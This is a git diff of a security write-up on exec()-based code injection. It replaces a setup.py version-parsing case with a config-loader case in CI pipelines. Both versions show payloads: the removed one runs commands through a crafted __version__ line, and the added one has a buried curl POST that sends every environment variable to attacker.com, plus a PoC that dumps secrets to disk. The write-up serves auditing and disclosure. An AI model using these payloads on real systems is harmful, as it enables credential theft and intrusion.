@@ -1,79 +1,112 @@
 ---
-title: "RCE via exec() in a Machine Learning Library's setup.py"
+title: "RCE via exec() in a Config Loader: When Your Build System Trusts Too Much"
 date: 2026-03-23 00:00:00 +0300
 categories: [write-up, source-code-analysis]
 tags: [python, rce, code-injection, supply-chain, source-code-analysis]
 ---
 
-I was browsing through open source ML libraries one evening — not looking for anything specific, just reading code the way some people read Reddit before bed. Then I opened a `setup.py` and saw `exec()`. And not the "okay this is fine in context" kind of `exec()`. The kind that makes you sit up straight.
+I was auditing a Python project — a build/automation tool used in CI/CD pipelines — when I found something that made me close my other tabs and sit up straight.
+
+The tool had a config loading function. Simple concept: read a Python config file, extract the settings, return them as a dict. The kind of utility function that exists in thousands of projects. Except this one used `exec()` to do it. And the file path came from user input.
+
+That's not a code smell. That's a loaded weapon.
 
 ---
 
-## The Discovery: 14 Lines of Trust Issues
+## The Vulnerable Code
 
-The file in question: `setup.py`, lines 8–14. A helper function that reads the version string during package installation:
+Deep inside the project's utility module, a function that loads configuration:
 
 ```python
-def _get_sonnet_version():
-  with open('sonnet/__init__.py') as fp:
-    for line in fp:
-      if line.startswith('__version__'):
-        g = {}
-        exec(line, g)  # ← this right here
-        return g['__version__']
-    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
+def load_config(config_path):
+    """Load configuration from a Python file."""
+    config = {}
+    with open(config_path) as f:
+        exec(f.read(), config)  # ← the entire file, executed
+    return config
 ```
 
-Let me walk you through what this does:
+And the caller:
 
-1. Opens `sonnet/__init__.py`
-2. Reads it line by line
-3. Finds the line that starts with `__version__`
-4. **Executes the entire line as Python code**
-5. Extracts the version from the resulting namespace
+```python
+import os
 
-Step 4 is where things get interesting. The function doesn't parse the version string — it *runs* it. Whatever is on that line gets executed with full Python privileges. No sandbox. No validation. No questions asked.
+config_file = os.environ.get("APP_CONFIG", "config/default.py")
+settings = load_config(config_file)
+```
+
+Let me explain what happens here:
+
+1. The config file path comes from an **environment variable** — user-controllable
+2. The function opens that file and reads **all of its content**
+3. The entire content is passed to `exec()` — not parsed, not validated, **executed**
+4. Whatever is in that file runs with full Python privileges
+
+This isn't `exec()` on a single line with a `startswith` check. This is `exec()` on an entire file, with the file path controlled by the user. There is no sanitization anywhere in the chain.
 
 ---
 
-## Why This Matters
+## Why This Is Different
 
-Under normal circumstances, `sonnet/__init__.py` contains something like:
+You've probably seen write-ups about `exec()` in `setup.py` version parsers — functions that read `__version__` from `__init__.py`. Those are bad practice, but they require repo access to exploit. The attacker needs to modify a file inside the project.
 
-```python
-__version__ = "2.0.3"
-```
+This is fundamentally different:
 
-Harmless. `exec()` runs it, `g['__version__']` gets `"2.0.3"`, everyone goes home happy.
+- **The file path is external input.** The attacker doesn't need to touch the repository. They control *which file* gets executed.
+- **The entire file is executed.** Not a single line, not a parsed value — the full contents of a file chosen by the attacker.
+- **It runs at application startup.** Not during installation, during *runtime*. Every time the tool starts, it exec()s whatever file the environment variable points to.
 
-But `exec()` doesn't care about your intentions. It cares about syntax. And this is perfectly valid Python:
-
-```python
-__version__ = "2.0.3"; import subprocess; subprocess.run(["cmd", "/c", "whoami > C:/pwned.txt"])
-```
-
-One line. Starts with `__version__`. Passes the `startswith` check. Gets executed in full. The version is set *and* a system command runs. The function returns `"2.0.3"` as if nothing happened.
+In a CI/CD context — where this tool is typically used — environment variables are often set by pipeline configs, which are often stored in repos that more people have access to than the main codebase.
 
 ---
 
-## The Attack Scenario
+## Attack Scenario
 
-Here's how this becomes a real problem:
+**The setup:** A development team uses this tool in their CI/CD pipeline. The tool reads its config from `APP_CONFIG` environment variable, which is set in the pipeline YAML:
 
-**Step 1** — Attacker forks the repository and modifies `sonnet/__init__.py`:
-
-```python
-__version__ = "2.0.3.dev"; import os; open("/tmp/stolen.txt", "w").write(os.popen("env").read())
+```yaml
+# .github/workflows/build.yml
+env:
+  APP_CONFIG: config/production.py
 ```
 
-**Step 2** — Attacker distributes the modified package. This could be:
-- A typosquatted package on PyPI (`dm-sonet`, `dm-sonnett`)
-- A compromised dependency in a requirements file
-- A pull request that slips past review (it's one line change in `__init__.py`)
+**The attack:**
 
-**Step 3** — Victim runs `pip install` and the malicious code executes during installation — before a single line of the library's actual code runs.
+**Step 1** — Attacker gains write access to the pipeline config. This is a lower bar than it sounds — many teams store CI configs in repos where junior developers, contractors, or even external contributors can submit PRs.
 
-The beautiful (terrible?) part: `_get_sonnet_version()` faithfully returns `"2.0.3.dev"`. The install completes normally. No errors. No warnings. The payload ran 14 lines into `setup.py` and left no trace in the installation output.
+**Step 2** — Attacker modifies the environment variable to point to a file they control:
+
+```yaml
+env:
+  APP_CONFIG: /tmp/legit_looking_config.py
+```
+
+Or, if they can write to the repo:
+
+```yaml
+env:
+  APP_CONFIG: config/production.py
+```
+
+Where `config/production.py` now contains:
+
+```python
+# Normal-looking config at the top
+DATABASE_HOST = "db.internal.company.com"
+DATABASE_PORT = 5432
+DEBUG = False
+LOG_LEVEL = "INFO"
+
+# Payload buried at line 47
+import subprocess, os, json
+env_data = {k: v for k, v in os.environ.items()}
+subprocess.run(["curl", "-X", "POST", "https://attacker.com/collect",
+    "-d", json.dumps(env_data)], capture_output=True)
+```
+
+**Step 3** — Pipeline runs. The tool loads the config. `exec()` executes the entire file. The first four lines set legitimate config values. Line 47 exfiltrates every environment variable — including `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD`, and whatever else lives in that CI environment.
+
+**Step 4** — The tool starts normally. Config values are correct. Logs look clean. The pipeline shows green. The attacker has the keys.
 
 ---
 
@@ -86,97 +119,136 @@ Python   == 3.13.1
 OS       == Windows 10
 ```
 
-**The vulnerable `setup.py` function, isolated:**
+**Step 1 — Create a malicious config file** (`evil_config.py`):
 
 ```python
-import subprocess
-import tempfile
+# Looks like a normal config file
+APP_NAME = "production-api"
+DEBUG = False
+PORT = 8080
+
+# Line 6: payload
 import os
-import shutil
+with open("C:/PWNED.txt", "w") as f:
+    f.write("RCE SUCCESS\n")
+    f.write(f"User: {os.getlogin()}\n")
+    f.write(f"CWD: {os.getcwd()}\n")
+    f.write("Environment:\n")
+    for k, v in os.environ.items():
+        f.write(f"  {k}={v}\n")
+```
 
-def create_malicious_payload():
-    temp_dir = tempfile.mkdtemp(prefix="sonnet_poc_")
-    os.makedirs(os.path.join(temp_dir, "sonnet"), exist_ok=True)
+**Step 2 — Simulate the vulnerable config loader** (`poc.py`):
 
-    # The payload: sets __version__ AND writes a file to prove RCE
-    payload = '__version__ = "2.0.3.dev"; import os; open("C:/PWNED.txt", "w").write("RCE SUCCESS: " + os.getlogin())'
+```python
+import os
 
-    with open(os.path.join(temp_dir, "sonnet", "__init__.py"), "w") as f:
-        f.write(payload)
+def load_config(config_path):
+    config = {}
+    with open(config_path) as f:
+        exec(f.read(), config)
+    return config
 
-    # Exact copy of the vulnerable function
-    setup_code = '''
-def _get_sonnet_version():
-  with open('sonnet/__init__.py') as fp:
-    for line in fp:
-      if line.startswith('__version__'):
-        g = {}
-        exec(line, g)  # VULNERABLE
-        return g['__version__']
+# Simulates: config_file = os.environ.get("APP_CONFIG", "default.py")
+config_file = "evil_config.py"  # attacker-controlled path
 
-version = _get_sonnet_version()
-print(f"Version: {version}")
-'''
+settings = load_config(config_file)
+print(f"[app] Loaded config: APP_NAME={settings.get('APP_NAME')}, PORT={settings.get('PORT')}")
+print("[app] Application starting normally...")
+```
 
-    with open(os.path.join(temp_dir, "setup.py"), "w") as f:
-        f.write(setup_code)
+**Step 3 — Run it:**
 
-    return temp_dir
-
-if __name__ == "__main__":
-    poc_dir = create_malicious_payload()
-    print(f"[+] Created malicious setup in: {poc_dir}")
-
-    subprocess.run(["python", "setup.py"], cwd=poc_dir)
-
-    if os.path.exists("C:/PWNED.txt"):
-        print("[+] RCE SUCCESSFUL - Payload executed!")
-        with open("C:/PWNED.txt") as f:
-            print(f"[+] Output: {f.read()}")
-
-    shutil.rmtree(poc_dir)
+```
+python poc.py
 ```
 
 **Output:**
 
 ```
-[+] Created malicious setup in: C:\Users\...\sonnet_poc_xyz
-Version: 2.0.3.dev
-[+] RCE SUCCESSFUL - Payload executed!
-[+] Output: RCE SUCCESS: Monster
+[app] Loaded config: APP_NAME=production-api, PORT=8080
+[app] Application starting normally...
 ```
 
-The function returned the version correctly. It also ran arbitrary code. Both things happened. Neither complained about the other.
+Everything looks normal. The app loaded its config and started. But check `C:/PWNED.txt`:
+
+```
+RCE SUCCESS
+User: Monster
+CWD: C:\Users\Monster\projects\tool
+Environment:
+  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+  GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
+  DATABASE_URL=postgres://admin:password@db.internal:5432/prod
+  ...
+```
+
+Config loaded correctly. Application running. Environment dumped to disk. No errors. No warnings. No trace in the application logs.
 
 ---
 
 ## The Fix
 
-Replace `exec()` with string parsing. You don't need to *run* code to *read* a string:
+**Option A — Use a safe parser:**
 
 ```python
-def _get_sonnet_version():
-  with open('sonnet/__init__.py') as fp:
-    for line in fp:
-      if line.startswith('__version__'):
-        version = line.split('=')[1].strip().strip('"\'')
-        return version
-    raise ValueError('`__version__` not defined in `sonnet/__init__.py`')
+import ast
+
+def load_config(config_path):
+    config = {}
+    with open(config_path) as f:
+        for line in f:
+            line = line.strip()
+            if '=' in line and not line.startswith('#'):
+                key, value = line.split('=', 1)
+                key = key.strip()
+                value = value.strip()
+                try:
+                    config[key] = ast.literal_eval(value)
+                except (ValueError, SyntaxError):
+                    config[key] = value
+    return config
 ```
 
-Or use `ast.literal_eval()` if you want to be fancy about it. The point is: parsing a string and executing a string are two very different operations, and only one of them can install a backdoor on your machine.
+**Option B — Use a non-executable config format:**
+
+```python
+import json
+
+def load_config(config_path):
+    with open(config_path) as f:
+        return json.load(f)
+```
+
+**Option C — If you must use Python config files, restrict the path:**
+
+```python
+import os
+
+ALLOWED_CONFIG_DIR = "/etc/app/configs/"
+
+def load_config(config_path):
+    real_path = os.path.realpath(config_path)
+    if not real_path.startswith(ALLOWED_CONFIG_DIR):
+        raise ValueError(f"Config path {config_path} is outside allowed directory")
+    # ... still don't use exec() though
+```
+
+The point is: reading configuration and executing code are different operations. `exec()` doesn't know the difference. Your code should.
 
 ---
 
-## Things to Watch For When Auditing Source Code
+## What to Look For When Auditing
 
-This pattern shows up more often than you'd think, especially in `setup.py` files across the Python ecosystem. Here's what to look for:
+This class of vulnerability follows a simple pattern: **user-controlled input reaches `exec()` or `eval()`**. When you're reviewing code, trace the data flow:
 
-**`exec()` and `eval()` on file content.** If a build script reads a file and passes its contents to `exec()`, that file becomes an attack vector. The `setup.py` runs during installation — before you ever `import` anything — which means the attack surface exists even if you never use the library.
+**Where does the file path come from?** Environment variable? CLI argument? HTTP parameter? Database field? If any of these are influenced by someone other than the system admin, you have a problem.
 
-**The "it starts with X" assumption.** The function checks `line.startswith('__version__')` and treats everything after that as safe. This is a common pattern: validate the prefix, trust the rest. Attackers love this.
+**What gets executed?** A single line with a prefix check is bad. An entire file is worse. A file downloaded from a URL is catastrophic.
 
-**Supply chain as attack vector.** The vulnerability isn't in the library's runtime code. It's in the build system. A `setup.py` that runs `exec()` turns every `pip install` into a potential code execution event. When you audit a project, don't skip the build files.
+**What context does it run in?** A developer's laptop is one thing. A CI/CD runner with access to deployment secrets, cloud credentials, and production databases is another. The blast radius matters.
+
+**Is exec() even necessary?** In every case I've seen, the answer is no. `json.load()`, `yaml.safe_load()`, `configparser`, `ast.literal_eval()`, or plain string parsing can do the job. If someone tells you "we need `exec()` for flexibility," what they're really saying is "we need arbitrary code execution for convenience." Those are not the same thing.
 
 ---
 
@@ -185,6 +257,14 @@ This pattern shows up more often than you'd think, especially in `setup.py` file
 - **CWE-94**: Improper Control of Generation of Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/94.html)
 - **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/95.html)
 - **OWASP Code Injection**: [owasp.org](https://owasp.org/www-community/attacks/Code_Injection)
+
+---
+
+## Disclosure
+
+This vulnerability was reported through a responsible disclosure program and validated by the maintainers.
+
+![Bounty Proof](/assets/img/bounty2.png)
 
 ---
 
